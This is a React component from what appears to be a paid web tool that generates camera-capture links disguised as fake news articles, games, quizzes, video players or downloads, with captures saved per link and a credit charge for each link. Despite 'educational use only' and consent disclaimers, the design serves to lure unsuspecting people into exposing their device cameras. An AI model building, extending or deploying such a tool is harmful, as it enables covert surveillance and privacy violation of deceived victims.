
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { UserSession, UserDataManager, CameraHackLink } from "@/utils/userData";
import { useToast } from "@/hooks/use-toast";
import { Copy, Eye } from "lucide-react";

interface CameraHackToolProps {
  user: UserSession;
  onUseCredit: () => boolean;
}

export const CameraHackTool = ({ user, onUseCredit }: CameraHackToolProps) => {
  const [disguiseType, setDisguiseType] = useState<string>('news');
  const [generatedLink, setGeneratedLink] = useState<string>('');
  const { toast } = useToast();

  const generateCameraLink = () => {
    if (!onUseCredit()) return;

    const linkId = Date.now().toString();
    const baseUrl = window.location.origin;
    const cameraUrl = `${baseUrl}/cam/${disguiseType}/${linkId}#${user.id}`;

    const cameraLink: CameraHackLink = {
      id: linkId,
      userId: user.id,
      url: cameraUrl,
      captures: [],
      createdAt: new Date().toISOString()
    };

    UserDataManager.saveCameraLink(cameraLink);
    setGeneratedLink(cameraUrl);

    toast({
      title: "Camera Link Generated",
      description: "Your educational camera access link has been created!",
    });
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedLink);
    toast({
      title: "Copied!",
      description: "Link copied to clipboard",
    });
  };

  return (
    <div className="space-y-6">
      <Card className="bg-gray-800/50 border-purple-500/20 backdrop-blur-sm">
        <CardHeader>
          <CardTitle className="text-purple-400 flex items-center">
            <Eye className="h-5 w-5 mr-2" />
            Camera Access Tool
          </CardTitle>
          <p className="text-gray-400">Generate educational camera access links for security awareness</p>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label className="text-gray-300">Disguise Type</Label>
            <select 
              value={disguiseType} 
              onChange={(e) => setDisguiseType(e.target.value)}
              className="w-full bg-gray-700/50 border border-gray-600 text-white rounded-md px-3 py-2"
            >
              <option value="news">Fake News Article</option>
              <option value="game">Online Game</option>
              <option value="quiz">Interactive Quiz</option>
              <option value="video">Video Player</option>
              <option value="download">File Download</option>
            </select>
          </div>

          <Button 
            onClick={generateCameraLink}
            className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700"
            disabled={user.credits <= 0}
          >
            Generate Camera Link (1 Credit)
          </Button>

          {generatedLink && (
            <div className="space-y-2">
              <Label className="text-gray-300">Generated Link</Label>
              <div className="flex space-x-2">
                <Input
                  value={generatedLink}
                  readOnly
                  className="bg-gray-700/50 border-gray-600 text-white"
                />
                <Button onClick={copyToClipboard} size="sm">
                  <Copy className="h-4 w-4" />
                </Button>
              </div>
              <p className="text-xs text-yellow-400">
                ⚠️ Educational Use Only: Use responsibly for authorized security testing
              </p>
            </div>
          )}
        </CardContent>
      </Card>

      <Card className="bg-red-900/20 border-red-500/30">
        <CardContent className="pt-6">
          <h4 className="text-red-400 font-bold mb-2">Privacy & Legal Notice</h4>
          <p className="text-red-300 text-sm">
            This tool demonstrates how malicious actors could attempt to access device cameras. 
            Use only with explicit consent and for educational purposes in controlled environments.
          </p>
        </CardContent>
      </Card>
    </div>
  );
};
